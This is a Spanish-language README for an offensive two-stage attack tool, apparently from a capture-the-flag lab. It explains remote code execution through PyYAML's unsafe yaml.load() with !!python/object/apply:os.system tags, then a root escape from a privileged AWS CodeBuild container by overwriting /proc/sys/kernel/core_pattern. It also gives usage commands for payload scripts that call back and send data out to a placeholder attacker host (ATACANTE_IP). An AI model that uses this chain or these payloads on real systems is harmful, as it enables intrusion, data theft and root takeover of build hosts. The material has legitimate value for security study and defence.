# PyYAML Unsafe Deserialization RCE -> AWS CodeBuild Privileged Container Escape

## Descripcion

Arme esta cadena de dos etapas. La primera abusa de una deserializacion insegura
de PyYAML: cuando una app pasa input del usuario a `yaml.load()` sin SafeLoader,
los tags `!!python/object/apply:os.system` ejecutan comandos arbitrarios durante
el parseo (RCE). La segunda etapa, ya con acceso a una API de AWS tipo LocalStack
que expone CodeBuild, crea un proyecto en `privilegedMode` y abusa de
`/proc/sys/kernel/core_pattern` para ejecutar un binario propio en el host cuando
un proceso crashea, logrando ejecucion como root en el host.

## Componentes

- **pyyaml-rce-payload.py** - genera los YAML maliciosos (ping/callback,
  exfiltracion de flags, enumeracion de entorno/nube) o un comando arbitrario
- **codebuild-core-pattern-escape.py** - crea y lanza el proyecto CodeBuild
  privilegiado que sobrescribe `core_pattern` para escapar al host

## Como funciona

### Etapa 1 - RCE via PyYAML

1. Identifico un endpoint que deserializa YAML con `yaml.load()` (sin SafeLoader)
2. Genero un payload con `!!python/object/apply:os.system [...]`
3. Al enviarlo, PyYAML ejecuta el comando durante el parseo

### Etapa 2 - Escape de contenedor via CodeBuild

1. Con acceso a la API de AWS/LocalStack, creo un proyecto CodeBuild con
   `privilegedMode: True`
2. El buildspec escribe un handler y lo registra en
   `/proc/sys/kernel/core_pattern` usando el `upperdir` del overlay
3. Fuerzo un `SIGSEGV`: el kernel del host ejecuta mi handler como root
4. El handler hace un callback (o lee `/root/root.txt`) desde el contexto del host

## Requisitos

```bash
pip install boto3
```

## Uso

```bash
# Etapa 1: generar payload de RCE
python3 pyyaml-rce-payload.py --lhost ATACANTE_IP --mode exfil -o payload.yaml

# Etapa 2: escape a root del host via CodeBuild
python3 codebuild-core-pattern-escape.py \
    --endpoint http://LOCALSTACK_HOST:4566 \
    --lhost ATACANTE_IP --lport 9000
```

## Detalles tecnicos

- **Etapa 1**: `yaml.load()` sin SafeLoader -> `os.system` via tag de PyYAML
- **Etapa 2**: contenedor `privilegedMode` + `core_pattern` apuntando al `upperdir`
  del overlayfs -> ejecucion en el host como root al disparar un core dump
- **Impacto**: RCE en la app y luego root en el host que corre los builds

## Aviso legal

Esta herramienta es unicamente para pruebas de seguridad autorizadas y fines
educativos. Obtene siempre autorizacion por escrito antes de testear contra
cualquier sistema.
